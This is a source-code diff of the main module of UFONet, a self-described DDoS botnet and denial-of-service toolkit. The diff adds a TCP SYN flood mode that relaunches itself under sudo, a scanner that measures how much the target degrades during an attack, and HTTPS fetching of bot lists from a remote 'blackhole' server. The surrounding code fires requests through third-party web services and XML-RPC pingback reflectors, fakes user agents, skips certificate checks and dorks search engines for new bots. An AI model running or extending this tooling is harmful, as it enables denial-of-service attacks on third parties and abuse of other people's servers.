@@ -1,14 +1,15 @@
 #!/usr/bin/env python 
 # -*- coding: utf-8 -*-"
 """
-UFONet - (DDoS botnet + DoS tool) via Web Abuse - 2013/2014/2015/2016/2017/2018 - by psy (epsylon@riseup.net)
+UFONet - Denial of Service Toolkit - 2013/2014/2015/2016/2017/2018 - by psy (epsylon@riseup.net)
 
 You should have received a copy of the GNU General Public License along
 with UFONet; if not, write to the Free Software Foundation, Inc., 51
 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
-import os, sys, re, traceback, random, time, threading, base64, socket, httplib, ssl, string
-import StringIO, urllib, urllib2, cgi, json
+import os, sys, re, traceback, random, time, threading, base64, string, math
+import StringIO, socket, httplib, urllib, urllib2, ssl, cgi, json
+from uuid import getnode
 from urlparse import urlparse
 from random import randrange, shuffle
 from options import UFONetOptions
@@ -20,6 +21,7 @@ from inspector import Inspector
 from abductor import Abductor
 from loic import LOIC
 from loris import LORIS
+from ufosyn import UFOSYN
 
 DEBUG = 0
 
@@ -36,7 +38,11 @@ class UFONet(object):
         self.humans_file = 'botnet/humans.txt' # set source path to retrieve 'humans'
         self.dorks_file = 'botnet/dorks.txt' # set source path to retrieve 'dorks'
         self.mothership_stats_file = 'core/json/stats.json' # set source for mothership stats
+        self.timeline_file = 'docs/VERSION' # set source for code releases
         self.referer = 'http://127.0.0.1/'
+        self.port = "8080" # default injection port
+        self.mothershipname = "core/txt/shipname.txt"
+        self.mothership_baptism() # generating static name/id for your mothership ;-)
         self.head = False
         self.payload = False
         self.external = False
@@ -47,7 +53,6 @@ class UFONet(object):
         self.total_possible_zombies = 0
         self.herd = Herd(self)
         self.sem = False
-        self.port = "8080" # default UFONet injection port
         self.db_flash = 0 # db stress counter
         self.total_aliens = 0 
         self.aliens_hit = 0
@@ -61,12 +66,45 @@ class UFONet(object):
         self.total_rpcs = 0
         self.rpcs_hit = 0
         self.rpcs_fail = 0
+        self.total_loic = 0
+        self.total_loris = 0
+        self.total_syn = 0
         self.ctx = ssl.create_default_context() # creating context to bypass SSL cert validation (black magic)
         self.ctx.check_hostname = False
         self.ctx.verify_mode = ssl.CERT_NONE
         self.nat_error_flag = "OFF"
         self.trans_zombies = 0
         self.scanned_zombies = 0
+        self.loadcheck_counter = 0
+        self.loadcheck_prev_size = None
+        self.loadcheck_prev_load = None
+        self.loadcheck_first_size = None
+        self.loadcheck_first_load = None
+        self.loadcheck_size_list = []
+        self.loadcheck_load_list = []
+        self.loadcheck_size_median = None
+        self.loadcheck_size_max = None
+        self.loadcheck_size_min = None
+        self.loadcheck_load_median = None
+        self.loadcheck_size_max = None
+        self.loadcheck_size_min = None
+
+    def mothership_baptism(self):
+        if os.path.exists(self.mothershipname) == True:
+            f = open(self.mothershipname)
+            self.mothership_id = f.read()
+            f.close()
+        else:
+            self.mothership_ids = [] 
+            f = open(self.motherships_file)
+            motherships = f.readlines()
+            f.close()
+            for ship in motherships:
+                self.mothership_ids.append(base64.urlsafe_b64encode(ship))
+            self.mothership_id = str(base64.b64decode(random.choice(self.mothership_ids).strip()))
+            m = open(self.mothershipname, "w") # write mothership name to a static file as a baptism
+            m.write(str(self.mothership_id.upper()))
+            m.close()
 
     def create_options(self, args=None):
         self.optionParser = UFONetOptions()
@@ -76,22 +114,24 @@ class UFONet(object):
         return self.options
 
     def banner_welcome(self):
-        print "                                             0===============================================0"
+        print ""
+        print "                     **                      0===============================================0"
         print "                '' '----' ''                 ||                                             ||"   
-        print "             .'_.- (    ) -._'.              ||  * Botnet -> DDoS:                          ||"
+        print "             .'_.- ( 00 ) -._'.              ||  * Botnet -> DDoS:                          ||"
         print "           .'.'    |'..'|    '.'.            ||                                             ||"
         print "    .-.  .' /'--.__|____|__.--'\ '.  .-.     ||      -Zombies : HTTP GET bots               ||"
-        print "   (O).)-| |  \  * |    |*   /  | |-(.(O)    ||      -Droids  : HTTP GET (+params) bots     ||"
-        print "    `-'  '-'-._'-./      \.-'_.-'-'  `-'     ||      -Aliens  : HTTP POST bots              ||"
-        print "       _ | |   '-.________.-'   | | _        ||      -UCAVs   : Web Abusing bots            ||"
+        print "   (O).)-| |  \  x |    |x   /  | |-(.(O)    ||      -Droids  : HTTP GET (+params) bots     ||"
+        print "    `-'  '-'-._'-./ ---- \.-'_.-'-'  `-'     ||      -Aliens  : HTTP POST bots              ||"
+        print "       _ | |   '-.___||___.-'   | | _        ||      -UCAVs   : Web Abusing bots            ||"
         print "    .' _ | |     |   __   |     | | _ '.     ||      -X-RPCs  : XML-RPC bots                ||"
         print "   / .' ''.|     | /____\ |     |.'' '. \    ||                                             ||"
-        print "   | |( )| '.    ||_____ ||    .' |( )| |    ||  * Close Combat -> DoS:                     ||"
+        print "   | |(0)| '.    ||__**_ ||    .' |(0)| |    ||  * Close Combat -> DoS:                     ||"
         print "   \ '._.'   '.  | \____/ |  .'   '._.' /    ||                                             ||"
         print "    '.__ ______'.|__'--'__|.'______ __.'     ||      -LOIC    : Fast HTTP requests          ||"
-        print "   .'_.-|                          |-._'.    ||      -LORIS   : Slow HTTP requests          ||"                                      
+        print "   .'_.-|                          |-._'.    ||      -LORIS   : Slow HTTP requests          ||"
+        print "                                             ||      -UFOSYN  : TCP SYN flooder             ||"                                      
         print "                                             ||                                             ||"
-        print "    * Class: UFONet - ViPR404 (model B)-     ||  * Featured: Crawler, +CVE, +WAF detection  ||"
+        print "    * Class: UFONet - ViPR404 (model C)-     ||  * Featured: Crawler, +CVE, +WAF detection  ||"
         print "    * Type: /Scout/Transporter/Warfare/      ||                                             ||"
         print "                                             0|=============================================|0" 
         print ""
@@ -109,6 +149,26 @@ class UFONet(object):
         print self.optionParser.description, "\n"
         print '='*75
 
+    def show_mac_address(self):
+        mac = getnode() # to get physical address
+        hex_mac = str(":".join(re.findall('..', '%012x' % mac)))
+        return hex_mac
+
+    def show_ips(self):
+        import requests
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80)) 
+            private_ip = s.getsockname()[0] # black magic
+            s.close()
+        except:
+            private_ip = "Unknown"
+        try:
+            public_ip = requests.get('https://ip.42.pl/raw').text
+        except:
+            public_ip = "Unknown"
+        return private_ip, public_ip
+
     def try_running(self, func, error, args=None):
         options = self.options
         args = args or []
@@ -116,7 +176,7 @@ class UFONet(object):
             return func(*args)
         except Exception as e:
             print(error, "error")
-            if DEBUG:
+            if DEBUG == 1:
                 traceback.print_exc()
 
     def start_ship_engine(self):
@@ -173,7 +233,7 @@ class UFONet(object):
             url = 'https://check.torproject.org' # TOR status checking site
             self.banner()
             print "\nSending request to: " + url + "\n"
-            self.user_agent = random.choice(self.agents).strip() # suffle user-agent
+            self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
             headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
             try:
                 if options.proxy: # set proxy
@@ -205,7 +265,7 @@ class UFONet(object):
             print " |=====/o/======================\o\=====| "
             print " |____/_/________..____..________\_\____| "
             print " /   _/ \_     <_o#\__/#o_>     _/ \_   \ "
-            print " \__/_____\####/__________/####/_____\__/ "
+            print " \__/_____\####/0213411543/####/_____\__/ "
             print "  |===\!/========================\!/===|  "
             print "  |   |=|          .---.         |=|   |  "
             print "  |===|o|=========/     \========|o|===|  "
@@ -227,6 +287,47 @@ class UFONet(object):
             print '\nLength:', len(msg)
             print '\n-> Key (share it using SNEAKNET!):', input_key
             print '\nDecryption PoC:', c.decrypt(), "\n"
+ 
+        # run shownet tool
+        if options.shownet:
+            hex_mac = self.show_mac_address()
+            self.banner()
+            print "-> Network Info:"
+            print '='*44
+            print "-"*35
+            print "|- MAC Address :", hex_mac
+            print "|" +"-"*34
+            private_ip, public_ip = self.show_ips()
+            print "|- IP Private  :", private_ip
+            print "|" +"-"*34
+            print "|- IP Public   :", public_ip
+            print "-"*35
+            print '='*75, "\n"
+
+        # show code timeline
+        if options.timeline:
+            f = open(self.timeline_file, 'r')
+            releases = f.readlines()
+            f.close()
+            self.banner()
+            print "-> Code timeline:"
+            print '='*44
+            print "-"*35
+            for r in releases:
+                print r.strip('\n')
+            print "-"*35
+            print '='*75, "\n"
+
+        # check EUID when running UFOSYN (root required for open 'raw sockets') / GUI will invoke 'sudo' directly
+        if options.ufosyn:
+            euid = os.geteuid()
+            if euid != 0:
+                print("[Error] UFOSYN (--ufosyn) not started as root...\n")
+                try:
+                    args = ['sudo', sys.executable] + sys.argv + [os.environ]
+                    os.execlpe('sudo', *args) 
+                except:
+                    pass # keep running but UFOSYN will fail
 
         # search for 'zombies' on search engines results (dorking)
         if options.search:
@@ -747,6 +848,7 @@ class UFONet(object):
 
         # attack me -> exploit Open Redirect massively and connect all vulnerable servers to master for benchmarking
         if options.attackme:
+            self.mothership_id = self.mothership_id[:25] # truncating anti-formats ;-)
             try:
                 self.banner()
                 print("\nOrdering 'zombies' to attack you for benchmarking ;-)\n")
@@ -758,13 +860,6 @@ class UFONet(object):
                 if update_reply == "n" or update_reply == "N":
                     print "\n[Info] Aborting 'Attack-Me' test... Bye!\n"
                     return
-                self.mothership_ids = [] # generating name/id for your mothership ;-)
-                f = open(self.motherships_file)
-                motherships = f.readlines()
-                f.close()
-                for ship in motherships:
-                    self.mothership_ids.append(base64.urlsafe_b64encode(ship))
-                self.mothership_id = str(base64.b64decode(random.choice(self.mothership_ids).strip()))
                 self.mothership_hash = str(random.getrandbits(128)) # generating random evasion hash  
                 print "\nMothership ID: " + self.mothership_id + "RND: " + self.mothership_hash
                 f = open("alien", "w") # generate random alien worker
@@ -955,7 +1050,7 @@ class UFONet(object):
     def update_flying_stats(self):
         if not os.path.exists(self.mothership_stats_file) == True: # create data when no stats file (first time used)
             with open(self.mothership_stats_file, "w") as f:
-                json.dump({"flying": "0", "missions": "0", "scanner": "0", "transferred": "0", "max_chargo": "0", "completed": "0", "loic": "0", "loris": "0", "crashed": "0"}, f, indent=4) # starting reset
+                json.dump({"flying": "0", "missions": "0", "scanner": "0", "transferred": "0", "max_chargo": "0", "completed": "0", "loic": "0", "loris": "0", "ufosyn": "0", "crashed": "0"}, f, indent=4) # starting reset
         stats_json_file = open(self.mothership_stats_file, "r")
         data = json.load(stats_json_file)
         stats_json_file.close()
@@ -1040,7 +1135,8 @@ class UFONet(object):
         data = json.load(stats_json_file)
         stats_json_file.close()
         aloic = data["loic"]
-        aloic = str(int(aloic) + 1) # add new loic attack
+        aloic = str(int(aloic) + 1) # add new loic attack to recorded stats
+        self.total_loic = self.total_loic + 1 # add new loic attack to session stats
         data["loic"] = aloic
         stats_json_file = open(self.mothership_stats_file, "w+")
         stats_json_file.write(json.dumps(data))
@@ -1051,8 +1147,21 @@ class UFONet(object):
         data = json.load(stats_json_file)
         stats_json_file.close()
         aloris = data["loris"]
-        aloris = str(int(aloris) + 1) # add new loris attack
+        aloris = str(int(aloris) + 1) # add new loris attack to recorded stats
+        self.total_loris = self.total_loris + 1 # add new loris attack to session stats
         data["loris"] = aloris
+        stats_json_file = open(self.mothership_stats_file, "w+")
+        stats_json_file.write(json.dumps(data))
+        stats_json_file.close()
+
+    def update_ufosyn_stats(self):
+        stats_json_file = open(self.mothership_stats_file, "r")
+        data = json.load(stats_json_file)
+        stats_json_file.close()
+        aufosyn = data["ufosyn"]
+        aufosyn = str(int(aufosyn) + 1) # add new ufosyn attack to recorded stats
+        self.total_syn = self.total_syn + 1 # add new ufosyn attack to session stats
+        data["ufosyn"] = aufosyn
         stats_json_file = open(self.mothership_stats_file, "w+")
         stats_json_file.write(json.dumps(data))
         stats_json_file.close()
@@ -1066,16 +1175,28 @@ class UFONet(object):
         reflectors = "reflectors.txt.gz"
         try:
             print("Checking integrity of 'blackhole'...\n")
-            urllib.urlretrieve('http://'+self.blackhole+'/ufonet/abductions.txt.gz',
-                    abductions)
-            urllib.urlretrieve('http://'+self.blackhole+'/ufonet/troops.txt.gz',
-                    troops)
-            urllib.urlretrieve('http://'+self.blackhole+'/ufonet/robots.txt.gz',
-                    robots)
-            urllib.urlretrieve('http://'+self.blackhole+'/ufonet/drones.txt.gz',
-                    drones)
-            urllib.urlretrieve('http://'+self.blackhole+'/ufonet/reflectors.txt.gz',
-                    reflectors)
+            if self.options.forcessl:
+                urllib.urlretrieve('https://'+self.blackhole+'/ufonet/abductions.txt.gz',
+                        abductions)
+                urllib.urlretrieve('https://'+self.blackhole+'/ufonet/troops.txt.gz',
+                        troops)
+                urllib.urlretrieve('https://'+self.blackhole+'/ufonet/robots.txt.gz',
+                        robots)
+                urllib.urlretrieve('https://'+self.blackhole+'/ufonet/drones.txt.gz',
+                        drones)
+                urllib.urlretrieve('https://'+self.blackhole+'/ufonet/reflectors.txt.gz',
+                        reflectors)
+            else:
+                urllib.urlretrieve('http://'+self.blackhole+'/ufonet/abductions.txt.gz',
+                        abductions)
+                urllib.urlretrieve('http://'+self.blackhole+'/ufonet/troops.txt.gz',
+                        troops)
+                urllib.urlretrieve('http://'+self.blackhole+'/ufonet/robots.txt.gz',
+                        robots)
+                urllib.urlretrieve('http://'+self.blackhole+'/ufonet/drones.txt.gz',
+                        drones)
+                urllib.urlretrieve('http://'+self.blackhole+'/ufonet/reflectors.txt.gz',
+                        reflectors)
             print("Vortex: IS READY!")
             f_in_abductions = gzip.open(abductions, 'rb')
             f_out_abductions = open('abductions.txt', 'wb')
@@ -1378,16 +1499,28 @@ class UFONet(object):
         reflectors = "reflectors.txt.gz"
         try:
             print("Trying 'blackhole': "+self.blackhole+"\n")
-            urllib.urlretrieve('http://'+self.blackhole+'/ufonet/abductions.txt.gz',
-                   abductions)
-            urllib.urlretrieve('http://'+self.blackhole+'/ufonet/troops.txt.gz',
-                   troops)
-            urllib.urlretrieve('http://'+self.blackhole+'/ufonet/robots.txt.gz',
-                   robots)
-            urllib.urlretrieve('http://'+self.blackhole+'/ufonet/drones.txt.gz',
-                   drones)
-            urllib.urlretrieve('http://'+self.blackhole+'/ufonet/reflectors.txt.gz',
-                   reflectors)
+            if self.options.forcessl:
+                urllib.urlretrieve('https://'+self.blackhole+'/ufonet/abductions.txt.gz',
+                       abductions)
+                urllib.urlretrieve('https://'+self.blackhole+'/ufonet/troops.txt.gz',
+                       troops)
+                urllib.urlretrieve('https://'+self.blackhole+'/ufonet/robots.txt.gz',
+                       robots)
+                urllib.urlretrieve('https://'+self.blackhole+'/ufonet/drones.txt.gz',
+                       drones)
+                urllib.urlretrieve('https://'+self.blackhole+'/ufonet/reflectors.txt.gz',
+                       reflectors)
+            else:
+                urllib.urlretrieve('http://'+self.blackhole+'/ufonet/abductions.txt.gz',
+                       abductions)
+                urllib.urlretrieve('http://'+self.blackhole+'/ufonet/troops.txt.gz',
+                       troops)
+                urllib.urlretrieve('http://'+self.blackhole+'/ufonet/robots.txt.gz',
+                       robots)
+                urllib.urlretrieve('http://'+self.blackhole+'/ufonet/drones.txt.gz',
+                       drones)
+                urllib.urlretrieve('http://'+self.blackhole+'/ufonet/reflectors.txt.gz',
+                       reflectors)
             print("Vortex: IS READY!")
         except:
             print("Vortex: FAILED!")
@@ -1608,7 +1741,7 @@ class UFONet(object):
         #    if options.dorks: # search from a dork
         #       q = 'inurl:"' + str(dork) + '"' # set query from a dork to search literally on results [ deprecated ]
         #    data = 'q=' + q + '&b=&kl=us-en&kp=-1' # evade safe search
-        #    self.user_agent = random.choice(self.agents).strip() # suffle user-agent
+        #    self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
         #    headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
         #    if options.verbose:
         #        print("[Info] Query used: " + url + " [POST -> " + data + "]\n")
@@ -1649,7 +1782,7 @@ class UFONet(object):
             query_string = { 'q':q, 'first':start }
             data = urllib.urlencode(query_string)
             url = url + data
-            self.user_agent = random.choice(self.agents).strip() # suffle user-agent
+            self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
             headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
             if options.verbose:
                 print("Query used: " + url + "\n")
@@ -1657,7 +1790,7 @@ class UFONet(object):
                 req = urllib2.Request(url, None, headers)
                 req_reply = urllib2.urlopen(req).read()
             except:
-                print('[Error] - Unable to connect to bing\n')
+                print('[Error] Unable to connect to: bing\n')
                 if options.allengines or options.autosearch:
                     return
                 if not options.dorks or not options.autosearch:
@@ -1698,7 +1831,7 @@ class UFONet(object):
         #    query_string = { 'q':q, 'start':start, 'num':num, 'gws_rd':gws_rd }
         #    data = urllib.urlencode(query_string)
         #    url = url + data
-        #    self.user_agent = random.choice(self.agents).strip() # suffle user-agent
+        #    self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
         #    headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
         #    if options.verbose:
         #        print("Query used: " + url + "\n")
@@ -1731,7 +1864,7 @@ class UFONet(object):
         elif options.engine == 'yahoo': # yahoo [27/06/2017: OK!]
             #location = ['fr', 'de', 'es', 'nl', 'it', 'se', 'ch', 'jp', 'ru', 'lt'] # generate 'flags' for location servers to evade Yahoo anti-dorking on main search webpage [grey magic: 18/08/2016]
             location = ['fr', 'de', 'es', 'nl', 'se', 'ch', 'ru'] # [08/04/2017]
-            location = str(random.choice(location).strip()) # suffle location
+            location = str(random.choice(location).strip()) # shuffle location
             url = 'https://'+location+'.search.yahoo.com/search?'
             if options.search: # search from query
                 q = 'instreamset:(url):"' + str(options.search) + '"' # set query to search literally on results
@@ -1741,7 +1874,7 @@ class UFONet(object):
             query_string = { 'p':q, 'b':start }
             data = urllib.urlencode(query_string)
             url = url + data
-            self.user_agent = random.choice(self.agents).strip() # suffle user-agent
+            self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
             headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
             if options.verbose:
                 print("Query used: " + url + "\n")
@@ -1749,7 +1882,7 @@ class UFONet(object):
                 req = urllib2.Request(url, None, headers)
                 req_reply = urllib2.urlopen(req).read()
             except:
-                print('[Error] - Unable to connect to yahoo\n')
+                print('[Error] Unable to connect to: yahoo\n')
                 if options.allengines or options.autosearch:
                     return
                 if not options.dorks or not options.autosearch:
@@ -1783,7 +1916,7 @@ class UFONet(object):
         #    query_string = { 'text':q, 'lr':lr, 'p':start }
         #    data = urllib.urlencode(query_string)
         #    url = url + data
-        #    self.user_agent = random.choice(self.agents).strip() # suffle user-agent
+        #    self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
         #    headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
         #    if options.verbose:
         #        print("Query used: " + url + "\n")
@@ -1898,7 +2031,6 @@ class UFONet(object):
     def check_nat(self):
         # check for NAT configuration
         options = self.options
-        from urllib import urlopen
         tor_reply = urllib2.urlopen("https://check.torproject.org").read() # check if TOR is enabled
         your_ip = tor_reply.split('<strong>')[1].split('</strong>')[0].strip()
         if not tor_reply or 'Congratulations' not in tor_reply:
@@ -1908,11 +2040,17 @@ class UFONet(object):
             self.nat_error_flag = "ON"
             return #sys.exit(2)
         try:
-            data = str(urlopen('http://checkip.dyndns.com/').read()) # check for public ip
+            if options.forcessl:
+                data = str(urlopen('https://checkip.dyndns.com/').read()) # check for public ip
+            else:
+                data = str(urlopen('http://checkip.dyndns.com/').read()) # check for public ip
             self.pub_ip = re.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(data).group(1)
         except:
             try: # another check for public ip
-                data = str(urlopen('http://whatismyip.org/').read())
+                if options.forcessl:
+                    data = str(urlopen('https://whatismyip.org/').read())
+                else:
+                    data = str(urlopen('http://whatismyip.org/').read())
                 self.pub_ip = re.compile(r'">(\d+\.\d+\.\d+\.\d+)</span>').search(data).group(1)
             except:
                 print("[Error] Something wrong checking your public IP using an external service. Try it again!\n")
@@ -1954,9 +2092,9 @@ class UFONet(object):
         print "\n[Info] Flying some UCAV with 'heat-beam' weapons...\n"
         ucavs = self.extract_ucavs() # extract ucavs from file
         self.total_ucavs = len(ucavs) # add total of ucavs to stats
-        shuffle(ucavs) # suffle ucavs
+        shuffle(ucavs) # shuffle ucavs
         for ucav in ucavs:
-            self.user_agent = random.choice(self.agents).strip() # suffle user-agent
+            self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
             headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
             if target.startswith("http://"): # parse target for some checkers
                 target = target.replace('http://','')
@@ -1991,7 +2129,7 @@ class UFONet(object):
             print "\n[Info] Congratulations!. Your target looks OFFLINE from external sources...\n"
             if not self.options.forceyes:
                 update_reply = raw_input("Want to send a [HEAD] check request from your proxy? (y/N)")
-                print '-'*25
+                print "\n" + '-'*25
             else:
                 update_reply = "N"
             if update_reply == "y" or update_reply == "Y":
@@ -2000,28 +2138,178 @@ class UFONet(object):
                     reply = self.connect_zombie(target)
                     self.head = False
                     if reply:
-                        print "\n[Info] Wow! Target is replying you... Keep shooting!\n"
+                        print "\n[Info] Wow! Target is replying you... [Keep shooting!]\n"
                     else:
-                        print "\n[Info] #UFONet TANGO DOWN!!! -> " +target + "\n"
+                        print "\n[Info] #UFONet TANGO DOWN!!! ;_) -> " +target + "\n"
                         self.update_targets_crashed() # update targets crashed stats
                         self.update_mothership_stats() # update mothership completed attack stats
                         if self.options.web:
                             return 
                         else:
-                            sys.exit(2) # Debug traceback (without crash) to celebrate it! ;-)
+                            sys.exit(2) # Debug traceback (without crash) for celebrate it! ;-)
                 except Exception:
-                    print "[Error] Something wrong with your connection!"
+                    print "\n[Error] Something wrong with your connection!\n"
                     if self.options.verbose:
                         traceback.print_exc()
                 return #sys.exit(2)
             else:
-                print "[Info] #UFONet TANGO DOWN!!! -> " +target + "\n"
+                print "\n[Info] #UFONet TANGO DOWN!!! ;_) -> " +target + "\n"
                 self.update_targets_crashed() # update targets crashed stats
                 self.update_mothership_stats() # update mothership completed attack stats
                 if self.options.web:
                     return 
                 else:
-                    sys.exit(2) # Debug traceback (without crash) for celebrate it! ;-)
+                    sys.exit(2) # Debug traceback (without crash...) for celebrate it! ;-)
+
+    def extract_median(self, num_list):
+        # extract median form a list of numbers
+        num_list.sort()
+        z = len(num_list)
+        if not z%2:
+           return (float(num_list[(z/2)-1])+float(num_list[z/2]))/2
+        else:
+           return float(num_list[z/2])
+
+    def check_is_loading(self, target):
+        # perform a broadband test (using GET) to analize target's reply to the traffic generated each round
+        self.start = None
+        self.stop = None
+        print '\n---------'
+        print "\n[Info] Scanning target to check for levels on defensive shields...\n"
+        if target.endswith(""):
+            target.replace("", "/")
+        self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
+        headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
+        try:
+            req = urllib2.Request(target, None, headers)
+            if self.options.proxy: # set proxy
+                self.proxy_transport(self.options.proxy)
+                self.start = time.time()
+                target_reply = urllib2.urlopen(req).read()
+                header = urllib2.urlopen(req).info()
+                self.stop = time.time()
+            else:
+                self.start = time.time()
+                target_reply = urllib2.urlopen(req, context=self.ctx).read()
+                header = urllib2.urlopen(req).info()
+                self.stop = time.time()
+        except:
+            print('[Error] Our scanner can not connect to the target this round... Skipping!\n')
+            return 
+        try:
+            s, size_name = self.convert_size(len(target_reply))
+            self.loadcheck_size_list.append(s) # add record to size list
+            size = '%s %s' % (s,size_name)
+        except:
+            size = "Error!"
+        try:
+            time_required = self.stop - self.start
+            load = self.convert_time(time_required)
+            self.loadcheck_load_list.append(load) # add record to load list
+        except:
+            load = "Error!"
+        self.loadcheck_counter = self.loadcheck_counter + 1
+        print ' -Total tests:', self.loadcheck_counter, "\n"
+        if self.loadcheck_prev_size is not None and self.loadcheck_prev_load is not None:
+            lsm = self.extract_median(self.loadcheck_size_list)
+            if lsm is not None:
+                self.loadcheck_size_median = str(lsm) + " " + size_name
+            else:
+                self.loadcheck_size_median = None
+            llm = self.extract_median(self.loadcheck_load_list)
+            if llm is not None:
+                self.loadcheck_load_median = str(llm) + " seconds"
+            else:
+                self.loadcheck_load_median = None
+            if self.loadcheck_counter == 2: # first round
+                print '   -Bytes in (first round)    :', self.loadcheck_first_size
+                print '   -Bytes in (this round)     :', size
+                if self.loadcheck_size_median is not None:
+                    print '   -Bytes in (median)         :', self.loadcheck_size_median
+                print ' ----'
+                print '   -Load time (first round)   :', self.loadcheck_first_load, "seconds"
+                print '   -Load time (this round)    :', load, "seconds"
+                if self.loadcheck_load_median is not None:
+                    print '   -Load time (median)        :', self.loadcheck_load_median, "\n"
+                else:
+                    print "\n"
+                self.loadcheck_size_max = None
+                self.loadcheck_size_min = None
+                self.loadcheck_load_max = None
+                self.loadcheck_load_min = None
+            elif self.loadcheck_counter > 2: # rest of rounds
+                lsmax = max(self.loadcheck_size_list)
+                if lsmax is not None:
+                    self.loadcheck_size_max = str(lsmax) + " " + size_name
+                else:
+                    self.loadcheck_size_max = None
+                lsmin = min(self.loadcheck_size_list)
+                if lsmin is not None:
+                    self.loadcheck_size_min = str(lsmin) + " " + size_name
+                else:
+                    self.loadcheck_size_min = None
+                llmax = max(self.loadcheck_load_list)
+                if llmax is not None:
+                    self.loadcheck_load_max = str(llmax) + " seconds"
+                else:
+                    self.loadcheck_load_max = None
+                llmin = min(self.loadcheck_load_list)
+                if llmin is not None:
+                    self.loadcheck_load_min = str(llmin) + " seconds"
+                else:
+                    self.loadcheck_load_min = None
+                print '   -Bytes in (first round)    :', self.loadcheck_first_size
+                print '   -Bytes in (previous round) :', self.loadcheck_prev_size
+                print '   -Bytes in (this round)     :', size
+                if self.loadcheck_size_max is not None:
+                    print '   -Bytes in (max)            :', self.loadcheck_size_max
+                if self.loadcheck_size_min is not None:
+                    print '   -Bytes in (min)            :', self.loadcheck_size_min
+                if self.loadcheck_size_median is not None:
+                    print '   -Bytes in (median)         :', self.loadcheck_size_median
+                print ' ----'
+                print '   -Load time (first round)   :', self.loadcheck_first_load, "seconds"
+                print '   -Load time (previous round):', self.loadcheck_prev_load, "seconds"
+                print '   -Load time (this round)    :', load, "seconds"
+                if self.loadcheck_load_max is not None:
+                    print '   -Load time (max)           :', self.loadcheck_load_max
+                if self.loadcheck_load_min is not None:
+                    print '   -Load time (min)           :', self.loadcheck_load_min
+                if self.loadcheck_load_median is not None:
+                    print '   -Load time (median)        :', self.loadcheck_load_median, "\n"
+                else:
+                    print "\n"
+            if self.loadcheck_prev_load < load: # target is loading more slowly
+                print "[Info] SCANNER: Your target is serving content more slowly this round... [Keep shooting!]\n"
+            elif self.loadcheck_prev_load == load: # inmutable target
+                print "[Info] SCANNER: Your attack is not having any effect on you target this round...\n"
+            elif self.loadcheck_prev_load > load: # is target defending?
+                print "[Info] SCANNER: Your target is loading this round faster than the previous one... o_0\n"
+        else:
+            print '   -Bytes in (this round) :', size
+            print '   -Load time (this round):', load, "seconds\n"
+            self.loadcheck_first_size = size
+            self.loadcheck_first_load = load
+            self.loadcheck_size_median = None
+            self.loadcheck_load_median = None
+            self.loadcheck_size_max = None
+            self.loadcheck_size_min = None
+            self.loadcheck_load_max = None
+            self.loadcheck_load_min = None
+        self.loadcheck_prev_size = size # record previous size
+        self.loadcheck_prev_load = load # record previous load
+
+    def convert_size(self, size):
+        if (size == 0):
+            return '0 B'
+        size_name = ("B", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB")
+        i = int(math.floor(math.log(size,1024)))
+        p = math.pow(1024,i)
+        s = round(size/p,2)
+        return s, size_name[i]
+
+    def convert_time(self, time):
+        return '%.2f' % time
 
     def send_aliens(self, target):
         # extract external web abuse services urls (POST) and perform requests against target
@@ -2029,7 +2317,7 @@ class UFONet(object):
         print "\n[Info] Deploying heavy alien troops with 'laser-cannon' weapons...\n"
         aliens = self.extract_aliens() # extract aliens from file
         self.total_aliens = len(aliens) # add total of aliens to stats
-        shuffle(aliens) # suffle aliens 
+        shuffle(aliens) # shuffle aliens 
         for alien in aliens:
             if "$POST" in alien: # extract alien/parameters -> search for $POST delimiter on 'aliens.txt' file
                 regex_alien = re.compile('{}(.*){}'.format(re.escape(''), re.escape(';$POST'))) # regex magics
@@ -2082,7 +2370,7 @@ class UFONet(object):
         print "\n[Info] Deploying droids with 'light-laser' weapons...\n"
         droids = self.extract_droids() # extract droids from file
         self.total_droids = len(droids) # add total of droids to stats
-        shuffle(droids) # suffle droids
+        shuffle(droids) # shuffle droids
         target = urllib.unquote(target).decode('utf8') # parte urlencoding
         if target.startswith('http://'): # remove http
             target = target.replace('http://', '')
@@ -2092,7 +2380,7 @@ class UFONet(object):
             if "$TARGET" in droid: # replace droid/parameter for target
                 url = droid.replace("$TARGET", target)
                 print "[Info] Firing from: " + url
-                self.user_agent = random.choice(self.agents).strip() # suffle user-agent 
+                self.user_agent = random.choice(self.agents).strip() # shuffle user-agent 
                 headers = {'User-Agent' : self.user_agent, 'Content-type' : "application/x-www-form-urlencoded", 'Referer' : self.referer, 'Connection' : 'keep-alive'} # set fake headers
                 try:
                     req = urllib2.Request(url, None, headers)
@@ -2127,8 +2415,8 @@ class UFONet(object):
         # extract vulnerable XML-RPC pingback services and perform requests against target
         print "\n[Info] Aiming 'plasma' cannon reflector turrets...\n"
         rpcs = self.extract_rpcs() # extract rpcs from file
-        self.total_rpcs = len(rpcs) # add total of rpcs to stats
-        shuffle(rpcs) # suffle rpcs
+        self.total_rpcs = len(rpcs) # add total rpcs to stats
+        shuffle(rpcs) # shuffle rpcs
         def random_key(length):
             key = ''
             for i in range(length):
@@ -2136,7 +2424,7 @@ class UFONet(object):
             return key
         for rpc in rpcs:
             print "[Info] Firing from: " + rpc
-            self.user_agent = random.choice(self.agents).strip() # suffle user-agent
+            self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
